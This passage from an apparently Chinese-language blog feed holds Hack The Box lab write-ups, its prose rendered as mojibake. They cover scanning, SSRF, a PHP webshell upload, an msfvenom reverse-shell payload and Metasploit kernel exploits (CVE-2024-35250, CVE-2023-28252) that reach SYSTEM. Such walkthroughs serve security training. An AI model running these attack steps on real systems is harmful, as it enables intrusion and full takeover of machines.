<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Meterpreter session <span class="token number">1</span> opened <span class="token punctuation">(</span><span class="token number">10.10</span>.16.30:4446 -<span class="token operator">></span> <span class="token number">10.10</span>.10.180:49698<span class="token punctuation">)</span> at <span class="token number">2025</span>-02-23 <span class="token number">23</span>:07:25 +0800

msf6 exploit<span class="token punctuation">(</span>multi/script/web_delivery<span class="token punctuation">)</span> <span class="token operator">></span> sessions 

Active sessions
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>

  Id  Name  Type                     Information                   Connection
  --  ----  ----                     -----------                   ----------
  <span class="token number">1</span>         meterpreter x64/windows  IIS APPPOOL<span class="token punctuation">\</span>DefaultAppPool @  <span class="token number">10.10</span>.16.30:4446 -<span class="token operator">></span> <span class="token number">10.10</span>.10.
                                      REMOTE                       <span class="token number">180</span>:49698 <span class="token punctuation">(</span><span class="token number">10.10</span>.10.180<span class="token punctuation">)</span>

msf6 exploit<span class="token punctuation">(</span>multi/script/web_delivery<span class="token punctuation">)</span> <span class="token operator">></span> sessions <span class="token parameter variable">-i</span> <span class="token number">1</span>
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Starting interaction with <span class="token number">1</span><span class="token punctuation">..</span>.

meterpreter <span class="token operator">></span> sysinfo 
Computer        <span class="token builtin class-name">:</span> REMOTE
OS              <span class="token builtin class-name">:</span> Windows Server <span class="token number">2019</span> <span class="token punctuation">(</span><span class="token number">10.0</span> Build <span class="token number">17763</span><span class="token punctuation">)</span>.
Architecture    <span class="token builtin class-name">:</span> x64
System Language <span class="token builtin class-name">:</span> en_US
Domain          <span class="token builtin class-name">:</span> WORKGROUP
Logged On Users <span class="token builtin class-name">:</span> <span class="token number">0</span>
Meterpreter     <span class="token builtin class-name">:</span> x64/windows</code></pre>

<h3 id="æƒé™æå‡"><a href="#æƒé™æå‡" class="headerlink" title="æƒé™æå‡"></a>æƒé™æå‡</h3><p>ä½¿ç”¨ <code>post/multi/recon/local_exploit_suggester</code>  æ”¶é›†ä¿¡æ¯ï¼ŒæŸ¥æ‰¾å¯ä»¥ææƒçš„è„šæœ¬</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">msf6 exploit<span class="token punctuation">(</span>multi/script/web_delivery<span class="token punctuation">)</span> <span class="token operator">></span> use post/multi/recon/local_exploit_suggester 
msf6 post<span class="token punctuation">(</span>multi/recon/local_exploit_suggester<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token builtin class-name">set</span> session <span class="token number">1</span>
session <span class="token operator">=</span><span class="token operator">></span> <span class="token number">1</span>
msf6 post<span class="token punctuation">(</span>multi/recon/local_exploit_suggester<span class="token punctuation">)</span> <span class="token operator">></span> exploit 
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token number">10.10</span>.10.180 - Collecting <span class="token builtin class-name">local</span> exploits <span class="token keyword">for</span> x64/windows<span class="token punctuation">..</span>.
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token number">10.10</span>.10.180 - <span class="token number">203</span> exploit checks are being tried<span class="token punctuation">..</span>.
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> <span class="token number">10.10</span>.10.180 - exploit/windows/local/bypassuac_comhijack: The target appears to be vulnerable.
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> <span class="token number">10.10</span>.10.180 - exploit/windows/local/bypassuac_dotnet_profiler: The target appears to be vulnerable.
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> <span class="token number">10.10</span>.10.180 - exploit/windows/local/bypassuac_sdclt: The target appears to be vulnerable.
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> <span class="token number">10.10</span>.10.180 - exploit/windows/local/bypassuac_sluihijack: The target appears to be vulnerable.
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> <span class="token number">10.10</span>.10.180 - exploit/windows/local/cve_2020_0787_bits_arbitrary_file_move: The target appears to be vulnerable. Vulnerable Windows <span class="token number">10</span> v1809 build detected<span class="token operator">!</span>
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> <span class="token number">10.10</span>.10.180 - exploit/windows/local/cve_2020_1048_printerdemon: The target appears to be vulnerable.
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> <span class="token number">10.10</span>.10.180 - exploit/windows/local/cve_2020_1337_printerdemon: The target appears to be vulnerable.
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> <span class="token number">10.10</span>.10.180 - exploit/windows/local/cve_2020_17136: The target appears to be vulnerable. A vulnerable Windows <span class="token number">10</span> v1809 build was detected<span class="token operator">!</span>
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> <span class="token number">10.10</span>.10.180 - exploit/windows/local/cve_2021_40449: The target appears to be vulnerable. Vulnerable Windows <span class="token number">10</span> v1809 build detected<span class="token operator">!</span>
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> <span class="token number">10.10</span>.10.180 - exploit/windows/local/cve_2022_21882_win32k: The target appears to be vulnerable.
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> <span class="token number">10.10</span>.10.180 - exploit/windows/local/cve_2022_21999_spoolfool_privesc: The target appears to be vulnerable.
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> <span class="token number">10.10</span>.10.180 - exploit/windows/local/cve_2024_30088_authz_basep: The target appears to be vulnerable. Version detected: Windows Server <span class="token number">2019</span>
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> <span class="token number">10.10</span>.10.180 - exploit/windows/local/cve_2024_35250_ks_driver: The target appears to be vulnerable. ks.sys is present, Windows Version detected: Windows Server <span class="token number">2019</span>
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> <span class="token number">10.10</span>.10.180 - exploit/windows/local/ms16_032_secondary_logon_handle_privesc: The <span class="token function">service</span> is running, but could not be validated.
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> <span class="token number">10.10</span>.10.180 - exploit/windows/local/ms16_075_reflection: The target appears to be vulnerable.
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Running check method <span class="token keyword">for</span> exploit <span class="token number">48</span> / <span class="token number">48</span>
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token number">10.10</span>.10.180 - Valid modules <span class="token keyword">for</span> session <span class="token number">1</span>:
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span></code></pre>

<p>æ ¹æ®æŸ¥æ‰¾ç»“æœä½¿ç”¨ <code>windows/local/cve_2024_35250_ks_driver</code> è¿›è¡Œææƒ</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">msf6 exploit<span class="token punctuation">(</span>windows/local/cve_2024_35250_ks_driver<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token builtin class-name">set</span> LHOST tun0 
LHOST <span class="token operator">=</span><span class="token operator">></span> <span class="token number">10.10</span>.16.30
msf6 exploit<span class="token punctuation">(</span>windows/local/cve_2024_35250_ks_driver<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token builtin class-name">set</span> session <span class="token number">3</span>
session <span class="token operator">=</span><span class="token operator">></span> <span class="token number">3</span>
msf6 exploit<span class="token punctuation">(</span>windows/local/cve_2024_35250_ks_driver<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token builtin class-name">set</span> LPORT <span class="token number">7777</span>
LPORT <span class="token operator">=</span><span class="token operator">></span> <span class="token number">7777</span>
msf6 exploit<span class="token punctuation">(</span>windows/local/cve_2024_35250_ks_driver<span class="token punctuation">)</span> <span class="token operator">></span> exploit 
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Started reverse TCP handler on <span class="token number">10.10</span>.16.30:7777 
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Running automatic check <span class="token punctuation">(</span><span class="token string">"set AutoCheck false"</span> to disable<span class="token punctuation">)</span>
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> The target appears to be vulnerable. ks.sys is present, Windows Version detected: Windows Server <span class="token number">2019</span>
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Launching notepad to <span class="token function">host</span> the exploit<span class="token punctuation">..</span>.
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> The notepad path is: C:<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>System32<span class="token punctuation">\</span>notepad.exe
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> The notepad pid is: <span class="token number">4628</span>
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Reflectively injecting the DLL into <span class="token number">4628</span><span class="token punctuation">..</span>.
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Sending stage <span class="token punctuation">(</span><span class="token number">203846</span> bytes<span class="token punctuation">)</span> to <span class="token number">10.10</span>.10.180
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Meterpreter session <span class="token number">4</span> opened <span class="token punctuation">(</span><span class="token number">10.10</span>.16.30:7777 -<span class="token operator">></span> <span class="token number">10.10</span>.10.180:49703<span class="token punctuation">)</span> at <span class="token number">2025</span>-02-23 <span class="token number">23</span>:26:34 +0800

meterpreter <span class="token operator">></span> getuid 
Server username: NT AUTHORITY<span class="token punctuation">\</span>SYSTEM
meterpreter <span class="token operator">></span> 
</code></pre>

<table>
<thead>
<tr>
<th align="left">Flag</th>
<th align="left">Path</th>
</tr>
</thead>
<tbody><tr>
<td align="left">Flag1</td>
<td align="left">C:\Users\Public\Desktop\user.txt</td>
</tr>
<tr>
<td align="left">Flag2</td>
<td align="left">C:\Users\Administrator\Desktop\root.txt</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>Hackthebox</category>
      </categories>
      <tags>
        <tag>CVE</tag>
        <tag>ä¿¡æ¯æ”¶é›†</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB-Love</title>
    <url>/Hackthebox/htb/htb-love/</url>
    <content><![CDATA[<style>.opzuptsinwvn{zoom:50%;}</style><img src="/Hackthebox/htb/htb-love/c00774d8d806b82c709c596937a92d14.png" class="opzuptsinwvn">

<span id="more"></span>

<table>
<thead>
<tr>
<th align="left">OS</th>
<th align="left">Difficulty</th>
</tr>
</thead>
<tbody><tr>
<td align="left">Windows</td>
<td align="left">Easy</td>
</tr>
</tbody></table>
<h3 id="Nmap-Scan"><a href="#Nmap-Scan" class="headerlink" title="Nmap Scan"></a>Nmap Scan</h3><pre class="language-bash" data-language="bash"><code class="language-bash"> nmap <span class="token number">10.10</span>.10.239 <span class="token parameter variable">-sV</span> <span class="token parameter variable">-sC</span>  -p- <span class="token parameter variable">-T4</span> --min-rate <span class="token number">1000</span> <span class="token parameter variable">-e</span> tun0
Starting Nmap <span class="token number">7.95</span> <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at <span class="token number">2025</span>-02-22 <span class="token number">11</span>:34 CST
Nmap scan report <span class="token keyword">for</span> <span class="token number">10.10</span>.10.239
Host is up <span class="token punctuation">(</span><span class="token number">0</span>.13s latency<span class="token punctuation">)</span>.
Not shown: <span class="token number">65516</span> closed tcp ports <span class="token punctuation">(</span>reset<span class="token punctuation">)</span>
PORT      STATE SERVICE      VERSION
<span class="token number">80</span>/tcp    <span class="token function">open</span>  http         Apache httpd <span class="token number">2.4</span>.46 <span class="token punctuation">((</span>Win64<span class="token punctuation">)</span> OpenSSL/1.1.1j PHP/7.3.27<span class="token punctuation">)</span>
<span class="token operator">|</span> http-cookie-flags: 
<span class="token operator">|</span>   /: 
<span class="token operator">|</span>     PHPSESSID: 
<span class="token operator">|</span>_      httponly flag not <span class="token builtin class-name">set</span>
<span class="token operator">|</span>_http-title: Voting System using PHP
<span class="token operator">|</span>_http-server-header: Apache/2.4.46 <span class="token punctuation">(</span>Win64<span class="token punctuation">)</span> OpenSSL/1.1.1j PHP/7.3.27
<span class="token number">135</span>/tcp   <span class="token function">open</span>  msrpc        Microsoft Windows RPC
<span class="token number">139</span>/tcp   <span class="token function">open</span>  netbios-ssn  Microsoft Windows netbios-ssn
<span class="token number">443</span>/tcp   <span class="token function">open</span>  ssl/http     Apache httpd <span class="token number">2.4</span>.46 <span class="token punctuation">(</span>OpenSSL/1.1.1j PHP/7.3.27<span class="token punctuation">)</span>
<span class="token operator">|</span> tls-alpn: 
<span class="token operator">|</span>_  http/1.1
<span class="token operator">|</span> ssl-cert: Subject: <span class="token assign-left variable">commonName</span><span class="token operator">=</span>staging.love.htb/organizationName<span class="token operator">=</span>ValentineCorp/stateOrProvinceName<span class="token operator">=</span>m/countryName<span class="token operator">=</span>in
<span class="token operator">|</span> Not valid before: <span class="token number">2021</span>-01-18T14:00:16
<span class="token operator">|</span>_Not valid after:  <span class="token number">2022</span>-01-18T14:00:16
<span class="token operator">|</span>_http-server-header: Apache/2.4.46 <span class="token punctuation">(</span>Win64<span class="token punctuation">)</span> OpenSSL/1.1.1j PHP/7.3.27
<span class="token operator">|</span>_ssl-date: TLS randomness does not represent <span class="token function">time</span>
<span class="token operator">|</span>_http-title: <span class="token number">400</span> Bad Request
<span class="token number">445</span>/tcp   <span class="token function">open</span>  microsoft-ds Windows <span class="token number">10</span> Pro <span class="token number">19042</span> microsoft-ds <span class="token punctuation">(</span>workgroup: WORKGROUP<span class="token punctuation">)</span>
<span class="token number">3306</span>/tcp  <span class="token function">open</span>  mysql        MariaDB <span class="token number">10.3</span>.24 or later <span class="token punctuation">(</span>unauthorized<span class="token punctuation">)</span>
<span class="token number">5000</span>/tcp  <span class="token function">open</span>  http         Apache httpd <span class="token number">2.4</span>.46 <span class="token punctuation">(</span>OpenSSL/1.1.1j PHP/7.3.27<span class="token punctuation">)</span>
<span class="token operator">|</span>_http-server-header: Apache/2.4.46 <span class="token punctuation">(</span>Win64<span class="token punctuation">)</span> OpenSSL/1.1.1j PHP/7.3.27
<span class="token operator">|</span>_http-title: <span class="token number">403</span> Forbidden
<span class="token number">5040</span>/tcp  <span class="token function">open</span>  unknown
<span class="token number">5985</span>/tcp  <span class="token function">open</span>  http         Microsoft HTTPAPI httpd <span class="token number">2.0</span> <span class="token punctuation">(</span>SSDP/UPnP<span class="token punctuation">)</span>
<span class="token operator">|</span>_http-server-header: Microsoft-HTTPAPI/2.0
<span class="token operator">|</span>_http-title: Not Found
<span class="token number">5986</span>/tcp  <span class="token function">open</span>  ssl/http     Microsoft HTTPAPI httpd <span class="token number">2.0</span> <span class="token punctuation">(</span>SSDP/UPnP<span class="token punctuation">)</span>
<span class="token operator">|</span>_http-server-header: Microsoft-HTTPAPI/2.0
<span class="token operator">|</span>_http-title: Not Found
<span class="token operator">|</span> ssl-cert: Subject: <span class="token assign-left variable">commonName</span><span class="token operator">=</span>LOVE
<span class="token operator">|</span> Subject Alternative Name: DNS:LOVE, DNS:Love
<span class="token operator">|</span> Not valid before: <span class="token number">2021</span>-04-11T14:39:19
<span class="token operator">|</span>_Not valid after:  <span class="token number">2024</span>-04-10T14:39:19
<span class="token operator">|</span>_ssl-date: <span class="token number">2025</span>-02-22T03:43:45+00:00<span class="token punctuation">;</span> +4m16s from scanner time.
<span class="token operator">|</span> tls-alpn: 
<span class="token operator">|</span>_  http/1.1
<span class="token number">7680</span>/tcp  <span class="token function">open</span>  pando-pub?
<span class="token number">47001</span>/tcp <span class="token function">open</span>  http         Microsoft HTTPAPI httpd <span class="token number">2.0</span> <span class="token punctuation">(</span>SSDP/UPnP<span class="token punctuation">)</span>
<span class="token operator">|</span>_http-title: Not Found
<span class="token operator">|</span>_http-server-header: Microsoft-HTTPAPI/2.0
<span class="token number">49664</span>/tcp <span class="token function">open</span>  msrpc        Microsoft Windows RPC
<span class="token number">49665</span>/tcp <span class="token function">open</span>  msrpc        Microsoft Windows RPC
<span class="token number">49666</span>/tcp <span class="token function">open</span>  msrpc        Microsoft Windows RPC
<span class="token number">49667</span>/tcp <span class="token function">open</span>  msrpc        Microsoft Windows RPC
<span class="token number">49668</span>/tcp <span class="token function">open</span>  msrpc        Microsoft Windows RPC
<span class="token number">49669</span>/tcp <span class="token function">open</span>  msrpc        Microsoft Windows RPC
<span class="token number">49670</span>/tcp <span class="token function">open</span>  msrpc        Microsoft Windows RPC
Service Info: Hosts: www.example.com, LOVE, www.love.htb<span class="token punctuation">;</span> OS: Windows<span class="token punctuation">;</span> CPE: cpe:/o:microsoft:windows

Host script results:
<span class="token operator">|</span>_clock-skew: mean: 2h04m17s, deviation: 4h00m02s, median: 4m15s
<span class="token operator">|</span> smb2-time: 
<span class="token operator">|</span>   date: <span class="token number">2025</span>-02-22T03:43:31
<span class="token operator">|</span>_  start_date: N/A
<span class="token operator">|</span> smb-security-mode: 
<span class="token operator">|</span>   account_used: guest
<span class="token operator">|</span>   authentication_level: user
<span class="token operator">|</span>   challenge_response: supported
<span class="token operator">|</span>_  message_signing: disabled <span class="token punctuation">(</span>dangerous, but default<span class="token punctuation">)</span>
<span class="token operator">|</span> smb2-security-mode: 
<span class="token operator">|</span>   <span class="token number">3</span>:1:1: 
<span class="token operator">|</span>_    Message signing enabled but not required
<span class="token operator">|</span> smb-os-discovery: 
<span class="token operator">|</span>   OS: Windows <span class="token number">10</span> Pro <span class="token number">19042</span> <span class="token punctuation">(</span>Windows <span class="token number">10</span> Pro <span class="token number">6.3</span><span class="token punctuation">)</span>
<span class="token operator">|</span>   OS CPE: cpe:/o:microsoft:windows_10::-
<span class="token operator">|</span>   Computer name: Love
<span class="token operator">|</span>   NetBIOS computer name: LOVE<span class="token punctuation">\</span>x00
<span class="token operator">|</span>   Workgroup: WORKGROUP<span class="token punctuation">\</span>x00
<span class="token operator">|</span>_  System time: <span class="token number">2025</span>-02-21T19:43:34-08:00

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="token builtin class-name">.</span>
Nmap done: <span class="token number">1</span> IP address <span class="token punctuation">(</span><span class="token number">1</span> <span class="token function">host</span> up<span class="token punctuation">)</span> scanned <span class="token keyword">in</span> <span class="token number">282.61</span> seconds
</code></pre>

<p>é€šè¿‡æ‰«æåœ¨443 ç«¯å£å‘ç°ä¸€ä¸ªå­åŸŸåï¼Œå°†<code>love.htb</code>å’Œ<code>staging.love.htb</code>æ·»åŠ æœ¬åœ°åŸŸåè§£æåˆ°hostsæ–‡ä»¶</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> <span class="token string">'10.10.10.239 love.htb'</span> <span class="token operator">|</span> <span class="token function">sudo</span> <span class="token function">tee</span> <span class="token parameter variable">-a</span> /etc/hosts
<span class="token builtin class-name">echo</span> <span class="token string">'10.10.10.239 staging.love.htb'</span> <span class="token operator">|</span> <span class="token function">sudo</span> <span class="token function">tee</span> <span class="token parameter variable">-a</span> /etc/hosts</code></pre>

<h3 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h3><p>è®¿é—®<code>staging.love.htb</code> ç‚¹å‡»Demo æ‰¾åˆ°ä¸€ä¸ªè¾“å…¥æ¡†</p>
<img src="/Hackthebox/htb/htb-love/image-20250222122349377.png" class="" title="è®¿é—®">

<p>ä½¿ç”¨Python3 å¯ç”¨ä¸€ä¸ªwebæœåŠ¡ï¼Œåœ¨è¾“å…¥æ¡†ä¸­è¾“å…¥url ç„¶åç‚¹å‡»<code>Scan file</code> å‘ç°å­˜åœ¨SSRF</p>
<img src="/Hackthebox/htb/htb-love/image-20250222123810029.png" class="" title="SSRF">

<p>ä¾æ¬¡æ¢æµ‹å¼€æ”¾ç«¯å£ï¼Œå‘ç°åœ¨5000ç«¯å£å¯ä»¥è¯»å–åˆ°å‡­è¯</p>
<img src="/Hackthebox/htb/htb-love/image-20250222130122775.png" class="" title="å†…ç½‘æ¢æµ‹">

<p>å¯¹<code>love.htb</code>å’Œ<code>staging.love.htb</code> ç›®å½•è¿›è¡Œfuzz å‘ç°<code>love.htb</code> æœ‰ä¸ªadminé¡µé¢ï¼Œä½¿ç”¨è·å–åˆ°çš„å¸å·å¯†ç ç™»å½•ï¼Œç‚¹å‡»Votesï¼Œä¸Šä¼ phpæœ¨é©¬</p>
<img src="/Hackthebox/htb/htb-love/image-20250222131025885.png" class="" title="æ–‡ä»¶ä¸Šä¼ ">

<p>ä½¿ç”¨èšå‰‘è¿æ¥shell</p>
<img src="/Hackthebox/htb/htb-love/image-20250222142215068.png" class="" title="Getshell">

<img src="/Hackthebox/htb/htb-love/image-20250222133719719.png" class="" title="upload">

<p>å°†shellä»èšå‰‘è½¬åˆ°msfconsoleï¼šç”Ÿæˆåé—¨ï¼Œç„¶åä½¿ç”¨èšå‰‘ä¸Šä¼ æ–‡ä»¶å¹¶æ‰§è¡Œ</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># ç”Ÿæˆpayload</span>
msfvenom <span class="token parameter variable">-p</span> windows/x64/meterpreter/reverse_tcp <span class="token assign-left variable">LHOST</span><span class="token operator">=</span><span class="token number">10.10</span>.16.30 <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token number">4444</span> <span class="token parameter variable">-f</span> exe <span class="token operator">></span> shell.exe 
<span class="token punctuation">[</span>-<span class="token punctuation">]</span> No platform was selected, choosing Msf::Module::Platform::Windows from the payload
<span class="token punctuation">[</span>-<span class="token punctuation">]</span> No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: <span class="token number">510</span> bytes
Final size of exe file: <span class="token number">7168</span> bytes
<span class="token comment"># æ¥æ”¶åå¼¹shell</span>
msf6 exploit<span class="token punctuation">(</span>multi/handler<span class="token punctuation">)</span> <span class="token operator">></span> exploit 
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Started reverse TCP handler on <span class="token number">10.10</span>.16.30:4444 
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Sending stage <span class="token punctuation">(</span><span class="token number">203846</span> bytes<span class="token punctuation">)</span> to <span class="token number">10.10</span>.10.239
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Meterpreter session <span class="token number">1</span> opened <span class="token punctuation">(</span><span class="token number">10.10</span>.16.30:4444 -<span class="token operator">></span> <span class="token number">10.10</span>.10.239:52670<span class="token punctuation">)</span> at <span class="token number">2025</span>-02-22 <span class="token number">13</span>:43:06 +0800
meterpreter <span class="token operator">></span> getuid 
Server username: LOVE<span class="token punctuation">\</span>Phoebe</code></pre>

<h3 id="æƒé™æå‡"><a href="#æƒé™æå‡" class="headerlink" title="æƒé™æå‡"></a>æƒé™æå‡</h3><p>ä½¿ç”¨ <code>multi/recon/local_exploit_suggester</code>  æ”¶é›†ä¿¡æ¯ä¸ºææƒåšå‡†å¤‡</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">msf6 post<span class="token punctuation">(</span>multi/recon/local_exploit_suggester<span class="token punctuation">)</span> <span class="token operator">></span> run
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token number">10.10</span>.10.239 - Collecting <span class="token builtin class-name">local</span> exploits <span class="token keyword">for</span> x64/windows<span class="token punctuation">..</span>.
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token number">10.10</span>.10.239 - <span class="token number">203</span> exploit checks are being tried<span class="token punctuation">..</span>.
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> <span class="token number">10.10</span>.10.239 - exploit/windows/local/always_install_elevated: The target is vulnerable.
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> <span class="token number">10.10</span>.10.239 - exploit/windows/local/bypassuac_dotnet_profiler: The target appears to be vulnerable.
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> <span class="token number">10.10</span>.10.239 - exploit/windows/local/bypassuac_fodhelper: The target appears to be vulnerable.
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> <span class="token number">10.10</span>.10.239 - exploit/windows/local/bypassuac_sdclt: The target appears to be vulnerable.
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> <span class="token number">10.10</span>.10.239 - exploit/windows/local/cve_2021_40449: The target appears to be vulnerable. Vulnerable Windows <span class="token number">10</span> 20H2 build detected<span class="token operator">!</span>
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> <span class="token number">10.10</span>.10.239 - exploit/windows/local/cve_2022_21882_win32k: The target appears to be vulnerable.
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> <span class="token number">10.10</span>.10.239 - exploit/windows/local/cve_2022_21999_spoolfool_privesc: The target appears to be vulnerable.
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> <span class="token number">10.10</span>.10.239 - exploit/windows/local/cve_2023_28252_clfs_driver: The target appears to be vulnerable. The target is running windows version: <span class="token number">10.0</span>.19042.0 <span class="token function">which</span> has a vulnerable version of clfs.sys installed by default
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> <span class="token number">10.10</span>.10.239 - exploit/windows/local/cve_2024_35250_ks_driver: The target appears to be vulnerable. ks.sys is present, Windows Version detected: Windows <span class="token number">10</span> version 20H2
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> <span class="token number">10.10</span>.10.239 - exploit/windows/local/ms16_032_secondary_logon_handle_privesc: The <span class="token function">service</span> is running, but could not be validated.
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Running check method <span class="token keyword">for</span> exploit <span class="token number">48</span> / <span class="token number">48</span>
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token number">10.10</span>.10.239 - Valid modules <span class="token keyword">for</span> session <span class="token number">1</span>:
</code></pre>

<p>æŸ¥çœ‹ç³»ç»Ÿç‰ˆæœ¬ä¸º19042ï¼Œä½¿ç”¨<code>exploit/windows/local/cve_2023_28252_clfs_driver</code> è¿›è¡Œæƒé™æå‡</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">meterpreter <span class="token operator">></span> sysinfo 
Computer        <span class="token builtin class-name">:</span> LOVE
OS              <span class="token builtin class-name">:</span> Windows <span class="token number">10</span> <span class="token punctuation">(</span><span class="token number">10.0</span> Build <span class="token number">19042</span><span class="token punctuation">)</span>.
Architecture    <span class="token builtin class-name">:</span> x64
System Language <span class="token builtin class-name">:</span> en_US
Domain          <span class="token builtin class-name">:</span> WORKGROUP
Logged On Users <span class="token builtin class-name">:</span> <span class="token number">2</span>
Meterpreter     <span class="token builtin class-name">:</span> x64/windows</code></pre>

<pre class="language-bash" data-language="bash"><code class="language-bash">msf6 exploit<span class="token punctuation">(</span>windows/local/cve_2023_28252_clfs_driver<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token builtin class-name">set</span> LHOST tun0
LHOST <span class="token operator">=</span><span class="token operator">></span> <span class="token number">10.10</span>.16.30
msf6 exploit<span class="token punctuation">(</span>windows/local/cve_2023_28252_clfs_driver<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token builtin class-name">set</span> session <span class="token number">1</span>
session <span class="token operator">=</span><span class="token operator">></span> <span class="token number">1</span>
msf6 exploit<span class="token punctuation">(</span>windows/local/cve_2023_28252_clfs_driver<span class="token punctuation">)</span> <span class="token operator">></span> exploit 
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Started reverse TCP handler on <span class="token number">10.10</span>.16.30:4444 
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Running automatic check <span class="token punctuation">(</span><span class="token string">"set AutoCheck false"</span> to disable<span class="token punctuation">)</span>
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> The target appears to be vulnerable. The target is running windows version: <span class="token number">10.0</span>.19042.0 <span class="token function">which</span> has a vulnerable version of clfs.sys installed by default
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Launching netsh to <span class="token function">host</span> the DLL<span class="token punctuation">..</span>.
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Process <span class="token number">3976</span> launched.
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Reflectively injecting the DLL into <span class="token number">3976</span><span class="token punctuation">..</span>.
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Exploit finished, <span class="token function">wait</span> <span class="token keyword">for</span> <span class="token punctuation">(</span>hopefully privileged<span class="token punctuation">)</span> payload execution to complete.
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Sending stage <span class="token punctuation">(</span><span class="token number">203846</span> bytes<span class="token punctuation">)</span> to <span class="token number">10.10</span>.10.239
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Meterpreter session <span class="token number">2</span> opened <span class="token punctuation">(</span><span class="token number">10.10</span>.16.30:4444 -<span class="token operator">></span> <span class="token number">10.10</span>.10.239:52672<span class="token punctuation">)</span> at <span class="token number">2025</span>-02-22 <span class="token number">13</span>:55:57 +0800

meterpreter <span class="token operator">></span> getuid 
Server username: NT AUTHORITY<span class="token punctuation">\</span>SYSTEM</code></pre>

<table>
<thead>
<tr>
<th align="left">Flag</th>
<th align="left">Path</th>
</tr>
</thead>
<tbody><tr>
<td align="left">Flag1</td>
<td align="left">C:\Users\Phoebe\Desktop\user.txt</td>
</tr>
<tr>
<td align="left">Flag2</td>
<td align="left">C:\Users\Administrator\Desktop\root.txt</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>Hackthebox</category>
      </categories>
      <tags>
        <tag>RCE</tag>
        <tag>SSRF</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB-BountyHunter</title>
    <url>/Hackthebox/htb/htb-bountyhunter/</url>
    <content><![CDATA[<style>.tyihxtqwkjte{zoom:50%;}</style><img src="/Hackthebox/htb/htb-bountyhunter/a24c032885e56a17a6c74cc58b63e8f4.png" class="tyihxtqwkjte">

